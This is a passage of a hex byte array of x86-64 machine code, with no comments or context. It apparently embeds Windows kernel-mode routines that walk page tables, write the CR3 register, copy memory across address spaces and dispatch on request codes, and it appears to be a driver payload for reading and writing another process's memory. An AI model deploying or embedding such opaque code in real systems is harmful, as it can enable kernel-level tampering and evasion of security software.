    0x89, 0x5D, 0x60, 0x48, 0x8B, 0xC3, 0x48, 0x85, 0xD2, 0x74, 0x34, 0x4C, 0x8B, 0x52, 0x20, 0x4D,
    0x85, 0xD2, 0x74, 0x2B, 0x49, 0x23, 0xC8, 0x48, 0x8D, 0x45, 0x48, 0x45, 0x8B, 0xCD, 0x48, 0x89,
    0x44, 0x24, 0x20, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4A, 0x8D, 0x14, 0xF1, 0x48, 0x8D, 0x4D,
    0x60, 0x41, 0xFF, 0xD2, 0x48, 0x8B, 0x45, 0x60, 0x48, 0x8B, 0x15, 0x99, 0x2E, 0x00, 0x00, 0x41,
    0x84, 0xC5, 0x74, 0x61, 0x48, 0xBE, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x84, 0xC0,
    0x79, 0x0B, 0x48, 0x23, 0xC6, 0x81, 0xE7, 0xFF, 0xFF, 0x1F, 0x00, 0xEB, 0x9A, 0x48, 0x89, 0x5D,
    0xE8, 0x48, 0x85, 0xD2, 0x74, 0x2D, 0x4C, 0x8B, 0x52, 0x20, 0x4D, 0x85, 0xD2, 0x74, 0x24, 0x48,
    0x23, 0xC6, 0x48, 0x8D, 0x4D, 0xE8, 0x45, 0x8B, 0xCD, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4A,
    0x8D, 0x14, 0xF8, 0x48, 0x8D, 0x45, 0x48, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x48,
    0x8B, 0x5D, 0xE8, 0x48, 0x23, 0xDE, 0x4A, 0x8D, 0x0C, 0x23, 0x48, 0xF7, 0xDB, 0x48, 0x1B, 0xC0,
    0x48, 0x23, 0xC1, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x48, 0x41, 0x5F, 0x41, 0x5E, 0x41,
    0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,
    0xD9, 0x48, 0x85, 0xC9, 0x74, 0x3C, 0x48, 0x85, 0xD2, 0x74, 0x37, 0x48, 0x8B, 0x42, 0x48, 0x48,
    0x85, 0xC0, 0x74, 0x2E, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x74, 0x27, 0x48, 0x8B, 0x88, 0x98, 0x00,
    0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x1B, 0x48, 0x8B, 0x41, 0x20, 0x48, 0x85, 0xC0, 0x74, 0x12,
    0x48, 0x89, 0x59, 0x20, 0x48, 0x8B, 0x4B, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x05, 0x0F, 0x22, 0xD9,
    0xEB, 0x02, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0x4C, 0x8B, 0xDC, 0x49,
    0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x20, 0x57, 0x41, 0x54, 0x41, 0x55,
    0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0x3D, 0xA9, 0x2D, 0x00, 0x00, 0x33,
    0xDB, 0x4C, 0x8B, 0xE9, 0x48, 0x85, 0xFF, 0x0F, 0x84, 0x08, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2,
    0x0F, 0x84, 0xFF, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x58, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xF2,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x6F, 0x60, 0x48, 0x85, 0xED, 0x0F, 0x84, 0xE5, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x77, 0x10, 0x48, 0x85, 0xF6, 0x0F, 0x84, 0xD8, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x77,
    0x50, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0xCB, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x67, 0x68, 0x4D, 0x85,
    0xE4, 0x0F, 0x84, 0xBE, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x7F, 0x70, 0x4D, 0x85, 0xFF, 0x0F, 0x84,
    0xB1, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x4B, 0xC8, 0xFF, 0xD0, 0x0F, 0x57, 0xC0, 0x48, 0x8D, 0x54,
    0x24, 0x30, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x0F, 0x11, 0x44, 0x24, 0x20, 0xFF,
    0xD5, 0x85, 0xC0, 0x0F, 0x88, 0x8C, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x80, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xCD, 0xFF, 0xD6, 0x85, 0xC0,
    0x78, 0x66, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD7, 0xE8, 0xD6, 0xFE,
    0xFF, 0xFF, 0x48, 0x8B, 0xE8, 0x48, 0x85, 0xC0, 0x74, 0x4E, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x41, 0xFF, 0xD6, 0x48, 0x85, 0xC0, 0x74, 0x33, 0x4C, 0x8B, 0x70, 0x18, 0x4D, 0x85,
    0xF6, 0x74, 0x2A, 0x49, 0x83, 0xC6, 0x10, 0x49, 0x8B, 0x36, 0xEB, 0x16, 0x48, 0x8D, 0x4E, 0x58,
    0x41, 0xB0, 0x01, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x41, 0xFF, 0xD4, 0x85, 0xC0, 0x74, 0x0A, 0x48,
    0x8B, 0x36, 0x49, 0x3B, 0xF6, 0x75, 0xE5, 0xEB, 0x04, 0x48, 0x8B, 0x5E, 0x30, 0x48, 0x8B, 0xD7,
    0x48, 0x8B, 0xCD, 0xE8, 0x80, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x41, 0xFF, 0xD7,
    0x48, 0x8B, 0xC3, 0xEB, 0x02, 0x33, 0xC0, 0x4C, 0x8D, 0x5C, 0x24, 0x40, 0x49, 0x8B, 0x5B, 0x30,
    0x49, 0x8B, 0x6B, 0x38, 0x49, 0x8B, 0x73, 0x48, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x41,
    0x5D, 0x41, 0x5C, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57,
    0x41, 0x54, 0x41, 0x56, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x8B, 0x1D, 0x56, 0x2C,
    0x00, 0x00, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0xCF, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x43, 0x10, 0x48,
    0x8D, 0x55, 0x40, 0x48, 0x8B, 0x7B, 0x18, 0x48, 0xC7, 0x45, 0x40, 0x00, 0x00, 0x00, 0x00, 0xFF,
    0xD0, 0x85, 0xC0, 0x0F, 0x88, 0xB1, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x40, 0xFF, 0xD7, 0x4C,
    0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x9F, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x16, 0x2C,
    0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x8F, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x49, 0x38, 0x4D,
    0x85, 0xC9, 0x0F, 0x84, 0x82, 0x02, 0x00, 0x00, 0x45, 0x33, 0xD2, 0x48, 0x8D, 0x35, 0xEE, 0x21,
    0x00, 0x00, 0x33, 0xD2, 0x4D, 0x8B, 0xD9, 0x4C, 0x2B, 0xDE, 0x45, 0x8D, 0x62, 0x01, 0x45, 0x33,
    0xC0, 0x49, 0x8D, 0x3C, 0x13, 0x49, 0x8D, 0x0C, 0x30, 0x8A, 0x01, 0x38, 0x04, 0x39, 0x0F, 0x85,
    0x46, 0x02, 0x00, 0x00, 0x4D, 0x03, 0xC4, 0x49, 0x83, 0xF8, 0x10, 0x7C, 0xE8, 0x49, 0x63, 0xC2,
    0x4A, 0x8B, 0x4C, 0x08, 0x10, 0x48, 0x81, 0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x89, 0x0D, 0xF5,
    0x2B, 0x00, 0x00, 0xFF, 0x53, 0x40, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x2B, 0x02, 0x00, 0x00, 0x48,
    0xC7, 0x45, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x58, 0x08, 0x48, 0x8B, 0x7B, 0xF8, 0x48,
    0x85, 0xFF, 0x75, 0x09, 0x48, 0x39, 0x3B, 0x0F, 0x84, 0x0D, 0x02, 0x00, 0x00, 0x33, 0xF6, 0x48,
    0xF7, 0x03, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x86, 0xE5, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xB5,
    0x2B, 0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x49, 0xC1, 0xE8, 0x0C, 0x4B, 0x8D, 0x0C, 0x40, 0x48, 0x03,
    0xC9, 0x48, 0x8B, 0x54, 0xC8, 0x28, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
    0x48, 0x23, 0xD0, 0x49, 0x3B, 0xD0, 0x0F, 0x85, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x45,
    0x2B, 0x00, 0x00, 0x48, 0xC7, 0x45, 0x48, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84,
    0x80, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x20, 0x4D, 0x85, 0xD2, 0x0F, 0x84, 0x73, 0x01, 0x00,
    0x00, 0x49, 0x8B, 0xC6, 0x48, 0x8D, 0x4D, 0x48, 0x48, 0xC1, 0xE8, 0x27, 0x45, 0x8B, 0xCC, 0x25,
    0xFF, 0x01, 0x00, 0x00, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x14, 0xC7, 0x48, 0x8D,
    0x45, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x85, 0xC0, 0x0F, 0x88, 0x42, 0x01,
    0x00, 0x00, 0x48, 0x8B, 0x4D, 0x48, 0x41, 0x84, 0xCC, 0x0F, 0x84, 0x35, 0x01, 0x00, 0x00, 0x48,
    0x8B, 0x05, 0xE2, 0x2A, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x0F, 0x84, 0x1D, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x20, 0x4D, 0x85, 0xD2, 0x0F, 0x84,
    0x10, 0x01, 0x00, 0x00, 0x48, 0xBA, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0xC6, 0x48, 0xC1, 0xE8, 0x1E, 0x48, 0x23, 0xCA, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x45, 0x8B, 0xCC,
    0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x14, 0xC1, 0x48, 0x8D, 0x45, 0x38, 0x48, 0x8D,
    0x4D, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x85, 0xC0, 0x0F, 0x88, 0xD2, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x4D, 0xE0, 0x41, 0x84, 0xCC, 0x0F, 0x84, 0xC5, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0x05, 0x72, 0x2A, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x0F, 0x84, 0xAD, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x20, 0x4D, 0x85, 0xD2, 0x0F, 0x84,
    0xA0, 0x00, 0x00, 0x00, 0x48, 0xBA, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0xC6, 0x48, 0xC1, 0xE8, 0x15, 0x48, 0x23, 0xCA, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x45, 0x8B, 0xCC,
    0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x14, 0xC1, 0x48, 0x8D, 0x45, 0x38, 0x48, 0x8D,
    0x4D, 0xE8, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x85, 0xC0, 0x78, 0x66, 0x48, 0x8B,
    0x4D, 0xE8, 0x41, 0x84, 0xCC, 0x74, 0x5D, 0x48, 0x8B, 0x05, 0x0A, 0x2A, 0x00, 0x00, 0x48, 0xC7,
    0x45, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x49, 0x4C, 0x8B, 0x50, 0x20, 0x4D,
    0x85, 0xD2, 0x74, 0x40, 0x48, 0xBA, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0xC6, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0x23, 0xCA, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x45, 0x8B, 0xCC,
    0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x14, 0xC1, 0x48, 0x8D, 0x45, 0x38, 0x48, 0x8D,
    0x4D, 0xF0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x85, 0xC0, 0x78, 0x06, 0x44, 0x84,
    0x65, 0xF0, 0x75, 0x4C, 0x48, 0x8B, 0x0B, 0x41, 0x03, 0xF4, 0x48, 0xC1, 0xE9, 0x0C, 0x48, 0x81,
    0xC7, 0x00, 0x10, 0x00, 0x00, 0x48, 0x63, 0xC6, 0x48, 0x3B, 0xC1, 0x0F, 0x82, 0x1B, 0xFE, 0xFF,
    0xFF, 0x48, 0x83, 0xC3, 0x10, 0xE9, 0xF1, 0xFD, 0xFF, 0xFF, 0x45, 0x03, 0xD4, 0x49, 0x03, 0xD4,
    0x48, 0x83, 0xFA, 0x20, 0x0F, 0x8C, 0x94, 0xFD, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x9C, 0x24,
    0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5E, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0xC3,
    0x48, 0x8B, 0xC7, 0xEB, 0xE7, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C,
    0x24, 0x20, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x33, 0xDB,
    0x48, 0x8B, 0xF9, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xF1, 0x01, 0x00, 0x00, 0x48, 0x89, 0x15, 0x35,
    0x29, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xE1, 0x01, 0x00, 0x00, 0x48, 0x81, 0x79, 0x20,
    0x2D, 0xA1, 0xE7, 0x12, 0x0F, 0x85, 0xD3, 0x01, 0x00, 0x00, 0x8B, 0x09, 0x48, 0x89, 0x5C, 0x24,
    0x70, 0x85, 0xC9, 0x0F, 0x84, 0x06, 0x01, 0x00, 0x00, 0x83, 0xE9, 0x01, 0x74, 0x6A, 0x83, 0xE9,
    0x01, 0x74, 0x53, 0x83, 0xE9, 0x01, 0x74, 0x1F, 0x83, 0xF9, 0x01, 0x0F, 0x85, 0xA8, 0x01, 0x00,
    0x00, 0x48, 0x8B, 0x57, 0x48, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x1E, 0xFB, 0xFF, 0xFF, 0x48, 0x89,
    0x47, 0x38, 0xE9, 0x92, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x42, 0x10, 0x48, 0x8B, 0x72, 0x18, 0x48,
    0x8D, 0x54, 0x24, 0x68, 0x48, 0x8B, 0x4F, 0x18, 0x48, 0x89, 0x5C, 0x24, 0x68, 0xFF, 0xD0, 0x85,
    0xC0, 0x78, 0x0A, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0xFF, 0xD6, 0x48, 0x8B, 0xD8, 0x48, 0x89, 0x5F,
    0x38, 0xE9, 0x63, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x39, 0xFC, 0xFF, 0xFF, 0x48,
    0x89, 0x47, 0x40, 0xE9, 0x51, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x77, 0x30, 0x4C, 0x8B, 0xF3, 0x48,
    0x85, 0xF6, 0x0F, 0x84, 0x41, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x57, 0x08, 0x48, 0x8B, 0x4F, 0x40,
    0x49, 0x03, 0xD6, 0xE8, 0x84, 0xF8, 0xFF, 0xFF, 0x4C, 0x8B, 0xD0, 0x48, 0x85, 0xC0, 0x74, 0x65,
    0x48, 0x8B, 0xC8, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x69, 0x28, 0x00, 0x00, 0x81,
    0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x2B, 0xD1, 0x48, 0x8B, 0xEE, 0x48, 0x3B, 0xD6, 0x48, 0x0F,
    0x46, 0xEA, 0x48, 0x85, 0xC0, 0x74, 0x3E, 0x4C, 0x8B, 0x58, 0x20, 0x4D, 0x85, 0xDB, 0x74, 0x35,
    0x48, 0x8B, 0x4F, 0x28, 0x48, 0x8D, 0x44, 0x24, 0x70, 0x49, 0x03, 0xCE, 0x48, 0x89, 0x44, 0x24,
    0x20, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC5, 0x49, 0x8B, 0xD2, 0x41, 0xFF, 0xD3,
    0x85, 0xC0, 0x0F, 0x88, 0xDA, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xF5, 0x48, 0x2B, 0xF5, 0x75, 0x88,
    0xE9, 0xC4, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xE9, 0xC3, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0x6F, 0x30, 0x4C, 0x8B, 0xF3, 0x48, 0x85, 0xED, 0x0F, 0x84, 0xAA, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0x57, 0x08, 0x48, 0x8B, 0x4F, 0x40, 0x49, 0x03, 0xD6, 0xE8, 0xED, 0xF7, 0xFF, 0xFF, 0x4C,
    0x8B, 0xC8, 0x48, 0x85, 0xC0, 0x74, 0xCE, 0x4C, 0x8B, 0x7F, 0x28, 0x48, 0x8B, 0xC8, 0x48, 0x8B,
    0x05, 0xD3, 0x27, 0x00, 0x00, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00,
    0x48, 0x8B, 0xF5, 0x48, 0x2B, 0xD1, 0x48, 0x3B, 0xD5, 0x48, 0x0F, 0x46, 0xF2, 0x4D, 0x03, 0xFE,
    0x48, 0x85, 0xC0, 0x74, 0xA0, 0x4C, 0x8B, 0x50, 0x28, 0x4D, 0x85, 0xD2, 0x74, 0x97, 0x4C, 0x8B,
    0x60, 0x30, 0x4D, 0x85, 0xE4, 0x74, 0x8E, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD6,
    0x49, 0x8B, 0xC9, 0x41, 0xFF, 0xD2, 0x4C, 0x8B, 0xC0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x73, 0xFF,
    0xFF, 0xFF, 0x48, 0x85, 0xF6, 0x74, 0x18, 0x48, 0x8B, 0xC8, 0x4C, 0x2B, 0xF8, 0x48, 0x8B, 0xD6,
    0x41, 0x8A, 0x04, 0x0F, 0x88, 0x01, 0x48, 0xFF, 0xC1, 0x48, 0x83, 0xEA, 0x01, 0x75, 0xF1, 0x48,
    0x8B, 0xD6, 0x48, 0x89, 0x74, 0x24, 0x70, 0x49, 0x8B, 0xC8, 0x41, 0xFF, 0xD4, 0x4C, 0x03, 0xF6,
    0x48, 0x2B, 0xEE, 0x0F, 0x85, 0x56, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0xEB, 0x05, 0xB8, 0x0D, 0x00,
    0x00, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x8B, 0x6C, 0x24, 0x78, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0x45, 0x33, 0xD2, 0xF6,
    0xC1, 0x07, 0x75, 0x26, 0x48, 0x83, 0xFA, 0x08, 0x72, 0x20, 0x4C, 0x8B, 0xCA, 0x4C, 0x8B, 0xC1,
    0x49, 0xC1, 0xE9, 0x03, 0x49, 0x6B, 0xC1, 0xF8, 0x48, 0x03, 0xD0, 0x4D, 0x89, 0x10, 0x49, 0x83,
    0xC0, 0x08, 0x49, 0x83, 0xE9, 0x01, 0x75, 0xF3, 0xEB, 0x2E, 0xF6, 0xC1, 0x03, 0x75, 0x26, 0x48,
    0x83, 0xFA, 0x04, 0x72, 0x20, 0x4C, 0x8B, 0xCA, 0x4C, 0x8B, 0xC1, 0x49, 0xC1, 0xE9, 0x02, 0x49,
    0x6B, 0xC1, 0xFC, 0x48, 0x03, 0xD0, 0x45, 0x89, 0x10, 0x49, 0x83, 0xC0, 0x04, 0x49, 0x83, 0xE9,
    0x01, 0x75, 0xF3, 0xEB, 0x03, 0x4C, 0x8B, 0xC1, 0x48, 0x85, 0xD2, 0x74, 0x0C, 0x45, 0x88, 0x10,
    0x49, 0xFF, 0xC0, 0x48, 0x83, 0xEA, 0x01, 0x75, 0xF4, 0x48, 0x8B, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC1, 0x48, 0x0B, 0xC2, 0xA8, 0x07, 0x0F, 0x85, 0xA2, 0x00, 0x00, 0x00, 0x48, 0x3B,
    0xD1, 0x76, 0x46, 0x4D, 0x8B, 0xD0, 0x4C, 0x8B, 0xC9, 0x49, 0xC1, 0xEA, 0x03, 0x49, 0x6B, 0xC2,
    0xF8, 0x4C, 0x03, 0xC0, 0x48, 0x8B, 0x02, 0x48, 0x83, 0xC2, 0x08, 0x49, 0x89, 0x01, 0x49, 0x83,
    0xC1, 0x08, 0x49, 0x83, 0xEA, 0x01, 0x75, 0xEC, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x50, 0x01, 0x00,
    0x00, 0x49, 0x2B, 0xD1, 0x42, 0x8A, 0x04, 0x0A, 0x41, 0x88, 0x01, 0x49, 0xFF, 0xC1, 0x49, 0x83,
    0xE8, 0x01, 0x75, 0xF0, 0xE9, 0x38, 0x01, 0x00, 0x00, 0x0F, 0x83, 0x32, 0x01, 0x00, 0x00, 0x4E,
    0x8D, 0x14, 0x02, 0x49, 0x8B, 0xD0, 0x4E, 0x8D, 0x0C, 0x01, 0x83, 0xE2, 0x07, 0x74, 0x15, 0x4C,
    0x2B, 0xC2, 0x49, 0xFF, 0xCA, 0x49, 0xFF, 0xC9, 0x41, 0x8A, 0x02, 0x41, 0x88, 0x01, 0x48, 0x83,
    0xEA, 0x01, 0x75, 0xEE, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x04, 0x01, 0x00, 0x00, 0x49, 0xFF, 0xC8,
    0x49, 0xC1, 0xE8, 0x03, 0x49, 0xFF, 0xC0, 0x4D, 0x8D, 0x52, 0xF8, 0x49, 0x8B, 0x02, 0x4D, 0x8D,
    0x49, 0xF8, 0x49, 0x89, 0x01, 0x49, 0x83, 0xE8, 0x01, 0x75, 0xEC, 0xE9, 0xE1, 0x00, 0x00, 0x00,
    0xA8, 0x03, 0x0F, 0x85, 0x9A, 0x00, 0x00, 0x00, 0x48, 0x3B, 0xD1, 0x76, 0x45, 0x4D, 0x8B, 0xD0,
    0x4C, 0x8B, 0xC9, 0x49, 0xC1, 0xEA, 0x02, 0x49, 0x6B, 0xC2, 0xFC, 0x4C, 0x03, 0xC0, 0x8B, 0x02,
    0x48, 0x83, 0xC2, 0x04, 0x41, 0x89, 0x01, 0x49, 0x83, 0xC1, 0x04, 0x49, 0x83, 0xEA, 0x01, 0x75,
    0xED, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xA7, 0x00, 0x00, 0x00, 0x49, 0x2B, 0xD1, 0x42, 0x8A, 0x04,
    0x0A, 0x41, 0x88, 0x01, 0x49, 0xFF, 0xC1, 0x49, 0x83, 0xE8, 0x01, 0x75, 0xF0, 0xE9, 0x8F, 0x00,
    0x00, 0x00, 0x0F, 0x83, 0x89, 0x00, 0x00, 0x00, 0x4E, 0x8D, 0x14, 0x02, 0x49, 0x8B, 0xD0, 0x4E,
    0x8D, 0x0C, 0x01, 0x83, 0xE2, 0x03, 0x74, 0x15, 0x4C, 0x2B, 0xC2, 0x49, 0xFF, 0xCA, 0x49, 0xFF,
    0xC9, 0x41, 0x8A, 0x02, 0x41, 0x88, 0x01, 0x48, 0x83, 0xEA, 0x01, 0x75, 0xEE, 0x4D, 0x85, 0xC0,
    0x74, 0x5F, 0x49, 0xFF, 0xC8, 0x49, 0xC1, 0xE8, 0x02, 0x49, 0xFF, 0xC0, 0x4D, 0x8D, 0x52, 0xFC,
    0x41, 0x8B, 0x02, 0x4D, 0x8D, 0x49, 0xFC, 0x41, 0x89, 0x01, 0x49, 0x83, 0xE8, 0x01, 0x75, 0xEC,
    0xEB, 0x3F, 0x48, 0x3B, 0xD1, 0x76, 0x18, 0x4C, 0x8B, 0xC9, 0x48, 0x2B, 0xD1, 0x42, 0x8A, 0x04,
    0x0A, 0x41, 0x88, 0x01, 0x49, 0xFF, 0xC1, 0x49, 0x83, 0xE8, 0x01, 0x75, 0xF0, 0xEB, 0x22, 0x73,
    0x20, 0x4D, 0x8D, 0x48, 0xFF, 0x4C, 0x03, 0xC9, 0x4D, 0x8D, 0x50, 0xFF, 0x4C, 0x03, 0xD2, 0x41,
    0x8A, 0x02, 0x49, 0xFF, 0xCA, 0x41, 0x88, 0x01, 0x49, 0xFF, 0xC9, 0x49, 0x83, 0xE8, 0x01, 0x75,
    0xEE, 0x48, 0x8B, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0x33, 0xD2, 0x48, 0x85, 0xC9, 0x74, 0x1F, 0x8B,
    0xC2, 0x66, 0x39, 0x11, 0x74, 0x1A, 0x48, 0x3D, 0x40, 0x42, 0x0F, 0x00, 0x73, 0x0A, 0x48, 0xFF,
    0xC0, 0x66, 0x39, 0x14, 0x41, 0x75, 0xEF, 0xC3, 0xB8, 0x41, 0x42, 0x0F, 0x00, 0xC3, 0x33, 0xC0,
    0xC3, 0xCC, 0xCC, 0xCC, 0x45, 0x33, 0xD2, 0x4D, 0x85, 0xC0, 0x7E, 0x27, 0x48, 0x3B, 0xCA, 0x73,
    0x22, 0x48, 0x83, 0x7C, 0x24, 0x28, 0x01, 0x44, 0x88, 0x09, 0x74, 0x0A, 0x49, 0x8B, 0xC1, 0x48,
    0xC1, 0xE8, 0x08, 0x88, 0x41, 0x01, 0x48, 0x03, 0x4C, 0x24, 0x28, 0x49, 0xFF, 0xC2, 0x4D, 0x3B,
    0xD0, 0x7C, 0xD9, 0x48, 0x8B, 0xC1, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x56, 0x57,
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C, 0x24, 0xA0, 0x48, 0x81, 0xEC,
    0x60, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x05, 0x25, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89,
    0x45, 0x50, 0x48, 0x8B, 0xBD, 0xC0, 0x00, 0x00, 0x00, 0x33, 0xF6, 0x4D, 0x8B, 0xF0, 0x48, 0x89,
    0x4D, 0x88, 0x41, 0x81, 0xE0, 0x00, 0x20, 0x00, 0x00, 0x48, 0x89, 0x7D, 0xA8, 0x48, 0x89, 0x75,
    0xA0, 0x4D, 0x8B, 0xE1, 0x4C, 0x8B, 0xD2, 0x48, 0x8B, 0xD9, 0x48, 0x85, 0xD2, 0x74, 0x33, 0x4D,
    0x85, 0xC0, 0x75, 0x33, 0x48, 0x85, 0xC9, 0x75, 0x2E, 0x33, 0xC0, 0x48, 0x8B, 0x4D, 0x50, 0x48,
    0x33, 0xCC, 0xE8, 0x3B, 0xE4, 0xFF, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0xB0, 0x01, 0x00, 0x00, 0x48,
    0x81, 0xC4, 0x60, 0x01, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E,
